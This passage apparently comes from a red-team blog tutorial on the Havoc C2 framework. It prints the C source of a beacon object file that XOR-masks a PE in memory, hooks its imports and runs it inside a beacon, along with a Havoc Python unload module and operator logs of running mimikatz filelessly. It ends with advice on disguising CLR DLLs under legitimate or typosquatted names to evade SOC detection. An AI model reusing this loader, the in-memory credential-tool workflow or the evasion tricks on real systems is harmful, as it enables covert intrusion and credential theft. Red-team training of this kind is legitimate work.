		memset(array[i], 0, wcslen(array[i]) * 2);
	}
	LocalFree(array);
}

//This function XOR's/un-XOR's PE in memory
void xorPE(char* pImageBase, DWORD sizeofimage, char* key)
{
	//Copy key into char array for easier use in XOR function
	char temp[100] = {0};
	memcpy(temp, key, strlen(key));

	DWORD a = 0;

	while (a < sizeofimage) {
		//If byte isn't null, we xor it
		if(*(pImageBase + a) != 0x00) //if((*(pImageBase + a) != 0x00 ) && (*(pImageBase + a) ^ temp[a % strlen(temp)] != 0x00))
		{
			//XOR byte using key
			*(pImageBase + a) ^= temp[a % strlen(temp)];

			//If resulting byte is a null byte, we xor back to original
			if(*(pImageBase + a) == 0x00)
			{
				*(pImageBase + a) ^= temp[a % strlen(temp)];
			}
		}
		a++;
	}
	memset(temp, 0, strlen(key));
	return;
}


//-------------------------These functions related to parsing PE and fixing the IAT of PE -------------------------

BYTE* getNtHdrs(BYTE* pe_buffer)
{
	if (pe_buffer == NULL) return NULL;

	IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)pe_buffer;
	if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
		return NULL;
	}
	const LONG kMaxOffset = 1024;
	LONG pe_offset = idh->e_lfanew;
	if (pe_offset > kMaxOffset) return NULL;
	IMAGE_NT_HEADERS32* inh = (IMAGE_NT_HEADERS32*)((BYTE*)pe_buffer + pe_offset);
	if (inh->Signature != IMAGE_NT_SIGNATURE) return NULL;
	return (BYTE*)inh;
}

IMAGE_DATA_DIRECTORY* getPeDir(PVOID pe_buffer, size_t dir_id)
{
	if (dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) return NULL;

	BYTE* nt_headers = getNtHdrs((BYTE*)pe_buffer);
	if (nt_headers == NULL) return NULL;

	IMAGE_DATA_DIRECTORY* peDir = NULL;

	IMAGE_NT_HEADERS* nt_header = (IMAGE_NT_HEADERS*)nt_headers;
	peDir = &(nt_header->OptionalHeader.DataDirectory[dir_id]);

	if (peDir->VirtualAddress == NULL) {
		return NULL;
	}
	return peDir;
}

//Fix IAT in manually mapped PE.  This is where we hook certain API's and redirect calls to them to our above defined functions.
BOOL fixIAT(PVOID modulePtr)
{
	IMAGE_DATA_DIRECTORY* importsDir = getPeDir(modulePtr, IMAGE_DIRECTORY_ENTRY_IMPORT);
	if (importsDir == NULL) return FALSE;

	size_t maxSize = importsDir->Size;
	size_t impAddr = importsDir->VirtualAddress;

	IMAGE_IMPORT_DESCRIPTOR* lib_desc = NULL;
	size_t parsedSize = 0;

	for (; parsedSize < maxSize; parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
		lib_desc = (IMAGE_IMPORT_DESCRIPTOR*)(impAddr + parsedSize + (ULONG_PTR)modulePtr);

		if (lib_desc->OriginalFirstThunk == NULL && lib_desc->FirstThunk == NULL) break;
		LPSTR lib_name = (LPSTR)((ULONGLONG)modulePtr + lib_desc->Name);
		//This BeaconPrintf will list every DLL imported by PE (but not those loaded by other DLL's...)
		//BeaconPrintf(CALLBACK_OUTPUT, "    [+] Import DLL: %s\n", lib_name);

		size_t call_via = lib_desc->FirstThunk;
		size_t thunk_addr = lib_desc->OriginalFirstThunk;
		if (thunk_addr == NULL) thunk_addr = lib_desc->FirstThunk;

		size_t offsetField = 0;
		size_t offsetThunk = 0;
		while (TRUE)
		{
			IMAGE_THUNK_DATA* fieldThunk = (IMAGE_THUNK_DATA*)((size_t)(modulePtr) + offsetField + call_via);
			IMAGE_THUNK_DATA* orginThunk = (IMAGE_THUNK_DATA*)((size_t)(modulePtr) + offsetThunk + thunk_addr);

			if (orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32 || orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) // check if using ordinal (both x86 && x64)
			{
				size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), (char*)(orginThunk->u1.Ordinal & 0xFFFF));
				fieldThunk->u1.Function = addr;
				//This BeaconPrintf will list api's imported by ordinal
				//BeaconPrintf(CALLBACK_OUTPUT, "        [V] API %x at %x\n", orginThunk->u1.Ordinal, addr);
			}

			if (fieldThunk->u1.Function == NULL)
				break;

			if(fieldThunk->u1.Function == orginThunk->u1.Function)
			{
				PIMAGE_IMPORT_BY_NAME by_name = (PIMAGE_IMPORT_BY_NAME)((size_t)(modulePtr) + orginThunk->u1.AddressOfData);
				LPSTR func_name = (LPSTR)by_name->Name;
				
				size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), func_name);
				//This BeaconPrintf will list api's imported by name
				//BeaconPrintf(CALLBACK_OUTPUT, "        [V] API %s at %x\n", func_name, addr);

				//We have to hook several functions in order to run our PE.
				//GetCommandLineA, GetCommandLineW, __getmainargs, __wgetmainargs, __p___argv, __p___wargv, __p___argc all relate to providing cmdline args to PE
				//exit, _Exit, _exit, quick_exit, and ExitProcess must be hooked so that when they are called we don't exit our beacon...

				if (hijackCmdline && _stricmp(func_name, "GetCommandLineA") == 0)
				{
					fieldThunk->u1.Function = (size_t)hookGetCommandLineA;
					//BeaconPrintf(CALLBACK_OUTPUT, "Hooked: %s\n", func_name);
				}
				else if (hijackCmdline && _stricmp(func_name, "GetCommandLineW") == 0)
				{
					fieldThunk->u1.Function = (size_t)hookGetCommandLineW;
					//BeaconPrintf(CALLBACK_OUTPUT, "Hooked: %s\n", func_name);
				}
				else if (hijackCmdline && _stricmp(func_name, "__wgetmainargs") == 0)
				{
					fieldThunk->u1.Function = (size_t)hook__wgetmainargs;
					//BeaconPrintf(CALLBACK_OUTPUT, "Hooked: %s\n", func_name);
				}
				else if (hijackCmdline && _stricmp(func_name, "__getmainargs") == 0)
				{
					fieldThunk->u1.Function = (size_t)hook__getmainargs;
					//BeaconPrintf(CALLBACK_OUTPUT, "Hooked: %s\n", func_name);
				}
				else if (hijackCmdline && _stricmp(func_name, "__p___argv") == 0)
				{
					fieldThunk->u1.Function = (size_t)hook__p___argv;
					//BeaconPrintf(CALLBACK_OUTPUT, "Hooked: %s\n", func_name);
				}
				else if (hijackCmdline && _stricmp(func_name, "__p___wargv") == 0)
				{
					fieldThunk->u1.Function = (size_t)hook__p___wargv;
					//BeaconPrintf(CALLBACK_OUTPUT, "Hooked: %s\n", func_name);
				}
				else if (hijackCmdline && _stricmp(func_name, "__p___argc") == 0)
				{
					fieldThunk->u1.Function = (size_t)hook__p___argc;
					//BeaconPrintf(CALLBACK_OUTPUT, "Hooked: %s\n", func_name);
				}
				else if (hijackCmdline && (_stricmp(func_name, "exit") == 0 || _stricmp(func_name, "_Exit") == 0 || _stricmp(func_name, "_exit") == 0 || _stricmp(func_name, "quick_exit") == 0))
				{
					fieldThunk->u1.Function = (size_t)hookexit;
					//BeaconPrintf(CALLBACK_OUTPUT, "Hooked: %s\n", func_name);
				}
				else if (hijackCmdline && _stricmp(func_name, "ExitProcess") == 0)
				{
					fieldThunk->u1.Function = (size_t)hookExitProcess;
					//BeaconPrintf(CALLBACK_OUTPUT, "Hooked: %s\n", func_name);
				}
				else
					fieldThunk->u1.Function = addr;

			}
			offsetField += sizeof(IMAGE_THUNK_DATA);
			offsetThunk += sizeof(IMAGE_THUNK_DATA);
		}
	}
	return TRUE;
}

BOOL peRun(char* key)
{

	//Decrypt PE in memory
	xorPE(pMemAddrs->pImageBase, pMemAddrs->SizeOfImage, key);

	//format and/or hook commandline args
	masqueradeCmdline();

	//Remap API's
	fixIAT((VOID*)pMemAddrs->pImageBase);

	//Make PE executable.  Note that RWX seems to be necessary here, using RX caused crashes. Maybe to do with parsing cmdline args?
	DWORD dwOldProtect;
	VirtualProtect(pMemAddrs->pImageBase, pMemAddrs->SizeOfImage, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	//Get timestamp immediately before running PE for comparison later
	LARGE_INTEGER frequency, before, after;
	QueryPerformanceFrequency(&frequency);
	QueryPerformanceCounter(&before);

	//Run PE
	HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)(pMemAddrs->pImageBase + pMemAddrs->AddressOfEntryPoint), 0, 0, 0);


//-----We now have to collect output from PE.  This is done in a loop in order to continue reading from pipe.------

    DWORD remainingDataOutput = 0;
	DWORD waitResult = -1;
    BOOL isThreadFinished = FALSE;
	DWORD bytesRead = 0;
	BOOL aborted = FALSE;

	//Allocate buffer to hold output from PE
	unsigned char* recvBuffer = calloc(BUFFER_SIZE, sizeof(unsigned char));

	do {	
		//Get current time
		QueryPerformanceCounter(&after);

		//Calculate elapsed time since thread started; if it exceeds our timeout, we want to bail out of execution and terminate the PE.
		if (((after.QuadPart - before.QuadPart) / frequency.QuadPart) > dwTimeout)
		{			
			//Kill PE thread
			TerminateThread(hThread, 0);

			//If we hit bailout condition we assume that something went wrong during execution
			//This often means that the FILE* we get (fout/ferr) after reopening stdout/stderr are hanging/messed up and cannot be closed
			//We must instruct peunload not to attempt to close these FILE* or we will lose comms with our Beacon
			pMemAddrs->bCloseFHandles = FALSE;
			aborted = TRUE;
		}

		//Wait for PE thread completion
		waitResult = WaitForSingleObject(hThread, _WAIT_TIMEOUT);
		switch (waitResult) {
		case WAIT_ABANDONED:
			break;
		case WAIT_FAILED:
			break;
		case _WAIT_TIMEOUT:
			break;
		case WAIT_OBJECT_0:
			isThreadFinished = TRUE;
		}

		//See if/how much data is available to be read from pipe
		PeekNamedPipe((VOID*)pMemAddrs->hreadout, NULL, 0, NULL, &remainingDataOutput, NULL);
		//BeaconPrintf(CALLBACK_OUTPUT, "Peek bytes available: %d!\nGetLastError: %d", remainingDataOutput, GetLastError());

		//If there is data to be read, zero out buffer, read data, and send back to CS
		if (remainingDataOutput) {
			memset(recvBuffer, 0, BUFFER_SIZE);
			bytesRead = 0;
			ReadFile( (VOID*)pMemAddrs->hreadout, recvBuffer, BUFFER_SIZE - 1, &bytesRead, NULL);

			//Send output back to CS
			BeaconPrintf(CALLBACK_OUTPUT, "%s", recvBuffer);

		}
	} while (!isThreadFinished || remainingDataOutput);

	//Free results buffer
	free(recvBuffer);
	
	//Free cmdline memory
	free(sz_masqCmd_Widh);
	freeargvA(poi_masqArgvA, int_masqCmd_Argc);
	freeargvW(poi_masqArgvW, int_masqCmd_Argc);

	//Revert memory protections on PE back to RW
	VirtualProtect(pMemAddrs->pImageBase, pMemAddrs->SizeOfImage, dwOldProtect, &dwOldProtect);

	//Refresh mapped PE with backup in order to restore to original state (and XOR encrypted again).
	memcpy(pMemAddrs->pImageBase, pMemAddrs->pBackupImage, pMemAddrs->SizeOfImage);

	//If we hit timeout on PE and killed it, let CS know.
	if(aborted)
		BeaconPrintf(CALLBACK_OUTPUT, "perun timeout");
	else
		BeaconPrintf(CALLBACK_OUTPUT, "perun complete");
}

int go(IN PCHAR Buffer, IN ULONG Length) 
{
	datap parser;
	BeaconDataParse(&parser, Buffer, Length);
	int dataextracted = 0;

	char* key = BeaconDataExtract(&parser, &dataextracted);
	char* pMemAddrstr = BeaconDataExtract(&parser, &dataextracted);
	sz_masqCmd_Ansi = BeaconDataExtract(&parser, &dataextracted);
	//dwTimeout = BeaconDataInt(&parser);
	dwTimeout = 5000;

	
	BeaconPrintf(CALLBACK_OUTPUT, "beaconarg key is: %s", key);
	BeaconPrintf(CALLBACK_OUTPUT, "beaconarg pMemAddrstr is: %s", pMemAddrstr);
	BeaconPrintf(CALLBACK_OUTPUT, "beaconarg cmdline is: %s", sz_masqCmd_Ansi);
	BeaconPrintf(CALLBACK_OUTPUT, "beaconarg dwTimeout is: %d", dwTimeout);
	

	//Associate pMemAddrs struct with address passed from CS
    char* pEnd;
	pMemAddrs = (struct MemAddrs*)_strtoi64(pMemAddrstr, &pEnd, 10);
	//BeaconPrintf(CALLBACK_OUTPUT, "pMemAddrs is: %p!", pMemAddrs);

	/* //Debug
	BeaconPrintf(CALLBACK_OUTPUT, "pMemAddrs->pImageBase is: %p!", pMemAddrs->pImageBase);
	BeaconPrintf(CALLBACK_OUTPUT, "pMemAddrs->pBackupImage is: %p!", pMemAddrs->pBackupImage);
	BeaconPrintf(CALLBACK_OUTPUT, "pMemAddrs->AddressOfEntryPoint: %d!", pMemAddrs->AddressOfEntryPoint);
	BeaconPrintf(CALLBACK_OUTPUT, "pMemAddrs->SizeOfImage: %d!", pMemAddrs->SizeOfImage);
	BeaconPrintf(CALLBACK_OUTPUT, "pMemAddrs->fout: %p!", pMemAddrs->fout);
	BeaconPrintf(CALLBACK_OUTPUT, "pMemAddrs->ferr: %p!", pMemAddrs->ferr);
	BeaconPrintf(CALLBACK_OUTPUT, "pMemAddrs->hreadout: %p!", pMemAddrs->hreadout);
	BeaconPrintf(CALLBACK_OUTPUT, "pMemAddrs->hwriteout: %p!", pMemAddrs->hwriteout);
	BeaconPrintf(CALLBACK_OUTPUT, "pMemAddrs->fo: %d!", pMemAddrs->fo);
	*/

	//Run PE
	peRun(key);

	return 0;
}
```

Now, all that's left to do is build everything. A `makefile` is included in the repo for easy building.

```
➜  Inline-Execute-PE git:(main) ✗ make
x86_64-w64-mingw32-gcc -c peload.c -o peload.x64.o -DBOF -Os
peload.c:16: warning: "stdin" redefined
   16 | #define stdin (__acrt_iob_funcs(0))
      |
In file included from bofdefs.h:3,
                 from peload.c:1:
/usr/share/mingw-w64/include/stdio.h:127: note: this is the location of the previous definition
  127 | #define stdin (__acrt_iob_func(0))
      |
peload.c:17: warning: "stdout" redefined
   17 | #define stdout (__acrt_iob_funcs(1))
      |
/usr/share/mingw-w64/include/stdio.h:128: note: this is the location of the previous definition
  128 | #define stdout (__acrt_iob_func(1))
      |
peload.c:18: warning: "stderr" redefined
   18 | #define stderr (__acrt_iob_funcs(2))
      |
/usr/share/mingw-w64/include/stdio.h:129: note: this is the location of the previous definition
  129 | #define stderr (__acrt_iob_func(2))
      |
peload.c: In function ‘getPeDir’:

[SNIP]
```

Once all the files are built, we can now import our new module into Havoc. 

# Testing the Inline-Execute-PE module

Like we did before with our `amsipatch` module, we'll import both the `peload.py` and `perun.py` modules.

![](/assets/imgs/havoc-c2/Pasted image 20240220132136.png)

![](/assets/imgs/havoc-c2/Pasted image 20240220132149.png)

After the import, both files should appear in the `Script Manager`.

![](/assets/imgs/havoc-c2/Pasted image 20240220132236.png)

We can now verify that the modules have been imported.

![](/assets/imgs/havoc-c2/Pasted image 20240220132345.png)

Looks like they have been!

## Using peload/perun to execute PE's inline

Now that we've confirmed that we have access to both modules in our Havoc environment. Let's attempt running mimikatz using them.

Firstly, like mentioned before, we will utilize `peload` to load the module into memory. We will also specify the XOR key to be used for the encryption of the PE's bytes in memory.

```
20/02/2024 13:25:14 [ori] Demon » peload /home/kali/SquidGuard/mimikatz.exe key123

[*] [8D6FABE1] Tasked beacon to load exe binary in memory
[+] Send Task to Agent [1355315 bytes]
[+] Received Output [20 bytes]:
peload 2502022862784
[*] BOF execution completed
```

Looks like the PE was successfully loaded into memory. The XOR key we decided to use in this example, is `key123`. We also obtained the memory address where our PE has been loaded at. It is also very important to understand that when working with BOF's, any small mistake can result in us crashing our beacon. Mistakes such as an incorrect number of arguments or incorrect argument placement can all result in us loosing our beacon. So, beware!

Now that our code is loaded into memory, we will utilize `perun` to execute it and get the output back.

```
20/02/2024 13:27:49 [ori] Demon » perun key123 2502022862784 " coffee exit"

[*] [58920CDE] Tasked beacon to execute exe loaded in memory
[+] Send Task to Agent [81 bytes]
[+] Received Output [24 bytes]:
beaconarg key is: key123
[+] Received Output [39 bytes]:
beaconarg pMemAddrstr is: 2502022862784
[+] Received Output [34 bytes]:
beaconarg cmdline is: coffee exit
[+] Received Output [28 bytes]:
beaconarg dwTimeout is: 5000
[+] Received Output [531 bytes]:


.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
.## ^ ##. "A La Vie, A L'Amour" - (oe.eo)
## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ## > https://blog.gentilkiwi.com/mimikatz
'## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com )
'#####' > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # coffee

( (
) )
.______.

| |]
\ /
`----'

mimikatz(commandline) # exit
Bye!


[+] Received Output [14 bytes]:
perun complete
[*] BOF execution completed
```

As you can see, this time, we were able to successfully run mimikatz completely in memory as well as obtain its output. We provided the XOR key, the entry memory address and the arguments to `perun` to ensure successful execution. If you look closely at the arguments we specified, you will notice an empty space before the "coffee" keyword. This is **intentional**. 

If this additional space isn't added, here's how the results will look like.

![](/assets/imgs/havoc-c2/Pasted image 20240220133054.png)

You will notice that only the `exit` command was executed as if the `coffee` command was not present. This issue is caused by the way our BOF parses our arguments. Unfortunately, we were not able to fix this issue at this time. So for the time being, this little tweak has to be used when executing inline PE's with `perun`.

## Unloading PE's to execute other ones

Now that we've tested `perun's` functionality with mimikatz, let's test it out with some other PE's. For the sake of simplicity, let's check out a binary called `sigcheck64.exe` which is a tool provided by Microsoft themselves to verify signatures on binaries. This binary is not written in C# so we should be able to test it out.

If we attempt to repeat the same steps we took to load mimikatz into memory, we will see that this time, the binary doesn't run, it instead crashes our beacon.

```
20/02/2024 14:31:21 [ori] Demon » peload /home/kali/VulnLabs/sigcheck64.exe test123

[*] [6F5CB3E2] Tasked beacon to load exe binary in memory
[+] Send Task to Agent [541140 bytes]
[+] Received Output [46 bytes]:
[+] Try to Allocate Memory for New Image Base
  

[+] Received Output [20 bytes]:
peload 2388938910560
[*] BOF execution completed

20/02/2024 14:31:42 [ori] Demon » perun test123 2388938910560 " -accepteula"
[*] [5EB7CF04] Tasked beacon to execute exe loaded in memory
[+] Send Task to Agent [82 bytes]
```

We even get a hint that memory space might be a problem : `[+] Try to Allocate Memory for New Image Base`. So, we'll need to unload PE's from memory when we're done using them. Luckily for us, the `Inline-Execute-PE` repo also provides a way to unload PE's. So let's take a look at how we will achieve this.

Start by opening the `peunload.c` file. We will first need to understand the arguments that it expects from us.

```
int go(IN PCHAR Buffer, IN ULONG Length)
{
        datap parser;
        BeaconDataParse(&parser, Buffer, Length);

        int dataextracted = 0;
        char* pEnd;

        char* pMemAddrstr = BeaconDataExtract(&parser, &dataextracted);
        pMemAddrs = (struct MemAddrs*)_strtoi64(pMemAddrstr, &pEnd, 10);
        bUnloadLibraries = BeaconDataInt(&parser);

        /* //Debug
        BeaconPrintf(CALLBACK_OUTPUT, "beaconarg pMemAddrstr is: %s", pMemAddrstr);
        BeaconPrintf(CALLBACK_OUTPUT, "pMemAddrs is: %p!", pMemAddrs);
        BeaconPrintf(CALLBACK_OUTPUT, "bUnloadLibraries is: %d!", bUnloadLibraries);
        */

        //Clear PE from memory and clean up handles, DLL's, etc
        peUnload();

        return 0;
}
```

The relevant code is highlighted below.

```
char* pMemAddrstr = BeaconDataExtract(&parser, &dataextracted);
        pMemAddrs = (struct MemAddrs*)_strtoi64(pMemAddrstr, &pEnd, 10);
        bUnloadLibraries = BeaconDataInt(&parser);
```

As you can see, the first argument is placed inside the `pMemAddrstr` variable which represents the entry point in memory of our PE's bytes. From there, the `bUnloadLibraries` is populated. Judging by the  `BeaconDataInt` API, we can assume that the `bUnloadLibraries` variable expects an integer as its argument. If we scroll up a bit in the code, we will see the part where this variable is used.

```
//If bUnloadLibraries == TRUE, unload DLL's.  This is default, but some PE's will crash if you try and unload the DLL's.
        //Observed with Powershell.exe, believe this is due to CLR being loaded by Powershell.
        if(bUnloadLibraries)
                cleanupModules(pMemAddrs->dwNumModules);
```

A check is made to determine if the variable's value is `TRUE` or `FALSE`. If `TRUE`, the libraries utilized by our PE will be unloaded. If `FALSE`, they will not be. In C, `TRUE` is represented by 1 and `FALSE` is represented by 0. Thus, we will need to provide either the value 0 or 1 for this argument. So in total, 2 arguments are expected to be provided :

- The entry point in memory of our PE's bytes
- 0 or 1 --> indicating if we want to unload the libraries or not

Now that we have a basic understanding of what is required to make this module work, we can proceed with creating the actual module in python.

`peunload.py`

```
from havoc import Demon, RegisterCommand
from struct import pack, calcsize

class Packer:
    def __init__(self):
        self.buffer : bytes = b''
        self.size   : int   = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addstr(self, s):
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s)+1, s)
        self.size += calcsize(fmt)
def peunload(demonID, *param):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

   # Check if process arch is x86, if yes, exit
    if demon.ProcessArch == "x86":
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
        return

   # Give some debug output to the operator of Havoc
    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked beacon to unload PE from memory" )

   # Initiate the Packer

    Task = Packer()

   # Specify the params for the BOF

    Task.addstr( param [ 0 ] )
    Task.addstr( param [ 1 ] )
    demon.InlineExecute( TaskID, "go", f"peunload.x64.o", Task.getbuffer(), False)
    return TaskID

RegisterCommand( peunload , "", "peunload", "Unloading of PE from memory", 0, "<entry point of PE's bytes> <0 or 1 to indicate unloading of libraries or not>", '2388938910560 1')
```

The module specifically accepts the 2 parameters that we just mentioned and executes the `peunload.x64.o` BOF. We have already compiled all the BOF's previously so this one should already be present.

### peunload in practice

Like we've done before, we will import `peunload.py` into Havoc. After import, we should see the import in the `Script Manager` along with the others we previously imported.

![](/assets/imgs/havoc-c2/Pasted image 20240220145413.png)

It's now time to test it out. For this, we've obtained a fresh beacon so we can start from scratch. We'll begin by :

- Loading mimikatz in memory and making it sure that it works when executed

```
20/02/2024 14:56:33 [ori] Demon » peload /home/kali/VulnLabs/mimikatz.exe key123
[*] [AE1C8960] Tasked beacon to load exe binary in memory
[+] Send Task to Agent [1355315 bytes]
[+] Received Output [20 bytes]:
peload 1737779845056

[*] BOF execution completed

20/02/2024 14:56:43 [ori] Demon » perun key123 1737779845056 " coffee exit"
[*] [685D1F72] Tasked beacon to execute exe loaded in memory
[+] Send Task to Agent [81 bytes]
[+] Received Output [24 bytes]:
beaconarg key is: key123
[+] Received Output [39 bytes]:
beaconarg pMemAddrstr is: 1737779845056
[+] Received Output [34 bytes]:
beaconarg cmdline is: coffee exit
[+] Received Output [28 bytes]:
beaconarg dwTimeout is: 5000
[+] Received Output [531 bytes]:

  

.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
.## ^ ##. "A La Vie, A L'Amour" - (oe.eo)
## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ## > https://blog.gentilkiwi.com/mimikatz
'## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com )
'#####' > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # coffee

( (
) )
.______.
| |]
\ /
`----'

mimikatz(commandline) # exit
Bye!

[+] Received Output [14 bytes]:
perun complete
[*] BOF execution completed
```

- Unload mimikatz using the memory address from `peload`

```
20/02/2024 14:57:02 [ori] Demon » peunload 1737779845056 1
[*] [F5136728] Tasked beacon to unload PE from memory
[+] Send Task to Agent [59 bytes]
[+] Received Output [37 bytes]:

Attempted to free DLL's loaded by PE!
[+] Received Output [19 bytes]:

peunload successful
[*] BOF execution completed
```

- Load the `sigcheck64.exe` binary we spoke of earlier

```
20/02/2024 14:57:34 [ori] Demon » peload /home/kali/VulnLabs/sigcheck64.exe key123
[*] [726A4DF0] Tasked beacon to load exe binary in memory
[+] Send Task to Agent [541139 bytes]
[+] Received Output [20 bytes]:
peload 1737779845056

[*] BOF execution completed
[+] Send Task to Agent [81 bytes]
```

- Attempt to execute it to verify it works

```
20/02/2024 14:57:49 [ori] Demon » perun key123 1737779845056 " -accepteula"

[*] [71F529EC] Tasked beacon to execute exe loaded in memory
[+] Received Output [24 bytes]:
beaconarg key is: key123
[+] Received Output [39 bytes]:
beaconarg pMemAddrstr is: 1737779845056
[+] Received Output [34 bytes]:
beaconarg cmdline is: -accepteula
[+] Received Output [28 bytes]:
beaconarg dwTimeout is: 5000
[+] Received Output [2940 bytes]:

(null) v(null) - (null)
(null)
(null)

usage: [-a][-h][-i][-e][-l][-n][[-s]|[-c|-ct]|[-m]][-q][-p <policy GUID>][-r][-u][-vt][-v[r][s]][-f catalog file] [-w file] <file or directory>
usage: -d [-c|-ct] [-w file] <file or directory>
usage: -o [-vt][-v[r]] [-w file] < csv file>
usage: -t[u][v] [-i] [-c|-ct] [-w file] <certificate store name|*>
-a Show extended version information. The entropy measure reported
is the bits per byte of information of the file's contents.
-c CSV output with comma delimiter
-ct CSV output with tab delimiter
Specify -nobanner to avoid banner being output to CSV
-d Dump contents of a catalog file
-e Scan executable images only (regardless of their extension)
-f Look for signature in the specified catalog file
-h Show file hashes
-i Show catalog name and signing chain
-l Traverse symbolic links and directory junctions
-m Dump manifest
-n Only show file version number
-o Performs Virus Total lookups of hashes captured in a CSV
file previously captured by Sigcheck when using the -h option.
This usage is intended for scans of offline systems.
-p Verify signatures against the specified policy, represented by
its GUID, or the custom code integrity policy stored in the specified
policy file.
-r Disable check for certificate revocation
-s Recurse subdirectories
-t[u][v] Dump contents of specified certificate store ('*' for all stores).
Specify -tu to query the user store (machine store is the default).
Append '-v' to have Sigcheck download the trusted Microsoft
root certificate list and only output valid certificates not rooted to
a certificate on that list. If the site is not accessible,
authrootstl.cab or authroot.stl in the current directory are
used instead, if present.
-u If VirusTotal check is enabled, show files that are unknown
by VirusTotal or have non-zero detection, otherwise show only
unsigned files.
-v[rs] Query VirusTotal (www.virustotal.com) for malware based on file hash.
Add 'r' to open reports for files with non-zero detection. Files
reported as not previously scanned will be uploaded to VirusTotal
if the 's' option is specified. Note scan results may not be
available for five or more minutes.
-vt Before using VirusTotal features, you must accept
VirusTotal terms of service. See:

https://www.virustotal.com/en/about/terms-of-service/

If you haven't accepted the terms and you omit this
option, you will be interactively prompted.
-w Writes the output to the specified file.
-nobanner
Do not display the startup banner and copyright message.

[+] Received Output [14 bytes]:
perun complete

[*] BOF execution completed
```

Looks like it works! We now have a way of loading different PE's in memory, unloading them and executing other ones. All from the same beacon and all in memory! The only caveat to consider is keeping the memory addresses outputted by `peload` for further use. If those addresses are lost, it can be very problematic to unload PE's from memory.

# What this would look like from a Blue Team's perspective

Now that we've discussed common commands, written custom Havoc modules to bypass protection mechanisms such as AMSI, it's now time to see how all those techniques we've utilized, would look like from a defender's perspective. 

Here's what we will be discussing in the upcoming blue team sections : 

- Detecting C# inline execution
- Seeing how our beacon may get caught by IDS/IPS systems such as `Suricata`
- Developing certain ways to remain undetected

# The Downsides of C# Inline execution

When performing inline C# execution through Havoc or any C2 that supports this feature. There's a few things to consider in terms of stealth. Firstly, in order to execute C# code, not just in memory, 2 specific DLL's need to be loaded into a process :

- clr.dll
- clrjit.dll

Which can be found accordingly in the following directory :

- C:\\Windows\\Microsoft.NET\\Framework64\\v.4.0.30319

Whenever we utilize inline C# execution, those 2 DLL's are loaded into our beacon's process. Now of course, those DLL's are legitimate Microsoft signed DLL's. However, as a defender, noticing processes that shouldn't utilize those DLL's does raise a suspicion. In a real world scenario, attackers tend to give their beacons legitimate names. Names such as `svchost.exe, chrome.exe, edge.exe` or any name that wouldn't directly raise suspicion. Although this can, at times, hide the beacon, it is not an ideal way of remaining undetected. We will go over why that is in the next sections.

In the following section, we will look at potential ways we can use to throw defenders off the right path with their investigation when it comes C# inline execution.

# Hiding our attempts at C# inline execution

## Renaming DLL's

As we've mentioned before, `clr.dll` and `clrjit.dll` get loaded into a process for C# code execution. One very important thing to consider when implementing any bypasses is ourselves a very important question : `If I was a defender, how would I go about detecting this?`. We also need to consider that SOC/forensics investigations usually only start several weeks if not months after an initial breach meaning that our beacons would have long been terminated when that happens. Still, the artifacts of our engagement can  remain in the environment and can be recovered, thus making stealth extra important.

Now if the organization that we are in does have some robust protection, they will definitely have a SIEM system up and running. SIEM's are systems that group all the logs obtained on machines where Agents are running. Those agents are responsible for collecting logs and sending them to the central castle : The SIEM. Logs are then stored on the SIEM and can be analyzed by SOC analysts. Of course, in a big organization's environment, the amount of logs collected can reach the millions by the day! Thus, when an attack does happen, investigating millions upon millions of logs can get rather overwhelming. For those reasons, SOC analysts utilize specialized filters when going through data in the SIEM. Of course, they will go out looking for the most obvious of things. For example, remember how we spoke about avoiding spawning processes such as cmd.exe and powershell.exe? Those tend to be clear indications of a compromise. EDR systems will also flag such processes based on UBA(User Behavior Analysis). Such processes are usually not part of a user's workflow and thus, those are flagged under the behavioral category. False positives are also very common although creation of such processes does raise an eyebrow. Additionally, SOC analysts are aware of the fact that C# inline execution relies on the 2 DLL's we spoke about previously. So, it would be a smart move to go out looking for specific names such as these 2 :

-  clr.dll
- clrjit.dll

But what if we decided to just rename them? Say, for example, to `test.dll` and `abcd.dll`? It's pretty obvious that creating a filter for this kind of tamper is practically impossible as possibilities are endless. Bonus points if you rename the DLL's to something legitimate but not related to C# in any kind. For example :

- combase.dll
- advapi32.dll

Those are some of the most common loaded DLL's in processes and these are not associated with any malicious activity. But you might be asking yourself, if those are already loaded in processes, how we can load our own DLL's with the same names?

Well, of course we can start by verifying for the presence of these DLL's in our process. If they are not already present, we can go ahead and load the legitimate `clr.dll` and `clrjit.dll` as `combase.dll` and `advapi32.dll`. However, if those DLL's are in fact already in use, we can utilize another popular technique that involves slightly altering the names of legitimate DLL's. For example :

- Instead of `advapi32.dll` --> `addvapi32.dll`
- Instead of `combase.dll` --> `commbase.dll`

Such changes are so subtle that they can barely be noticed. And once again, consider the sheer amount of logs that SOC analysts go through. Spotting such a difference in the millions of logs that we have available, is a very difficult task and would require a lot time and effort. With that being said, it is not impossible to spot these changes. Defenders could simply create a list with the most common DLL's loaded into processes and look for odd ones out. This technique isn't that common thus not all blue teams will go out there looking for it. But we figured it'd be a great addition to mention, because often times, those small details can make all the difference.
